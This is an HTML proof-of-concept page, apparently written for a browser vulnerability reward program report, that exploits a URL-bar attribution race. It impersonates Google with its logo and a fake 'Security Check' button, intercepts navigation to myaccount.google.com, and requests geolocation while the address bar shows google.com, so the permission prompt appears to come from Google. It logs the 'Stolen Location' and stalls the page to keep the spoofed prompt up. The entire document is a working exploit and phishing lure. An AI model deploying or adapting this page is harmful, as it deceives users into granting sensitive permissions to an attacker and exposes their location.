<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>VRP Research: Permission Attribution</title>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
        .box { border: 1px solid #dadce0; padding: 20px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
        <h3>Security Check</h3>
        <p>Google needs to verify your device location to secure this session.</p>
        <button class="btn" onclick="startAttributionRace()">Secure Session</button>
    </div>
    <div id="status" style="margin-top:20px; font-weight:bold;"></div>

    <script>
        function startAttributionRace() {
            const target = "https://myaccount.google.com/?pli=1";
            const status = document.getElementById('status');

            // 1. Set up the Navigation Intercept
            navigation.addEventListener('navigate', (event) => {
                if (event.destination.url.includes("google.com")) {
                    event.intercept({
                        handler: async () => {
                            status.innerText = "URL COMMITTED. REQUESTING PERMISSION...";
                            status.style.color = "orange";

                            // 2. THE GAP: Wait for the URL bar to finish updating
                            await new Promise(r => setTimeout(r, 800));

                            // 3. THE EXPLOIT: Request location while the URL bar says 'google.com'
                            navigator.geolocation.getCurrentPosition(
                                (pos) => {
                                    status.innerText = "SUCCESS: Permission Granted to " + location.origin;
                                    status.style.color = "green";
                                    console.log("Stolen Location:", pos);
                                },
                                (err) => {
                                    status.innerText = "DENIED: " + err.message;
                                    status.style.color = "red";
                                }
                            );

                            // Keep the renderer stalled so the user sees the 'Google' prompt
                            await new Promise(r => setTimeout(r, 10000));
                        }
                    });
                }
            }, { once: true });

            // 4. Trigger the transition
            window.location.href = target;
        }
    </script>
</body>
</html>
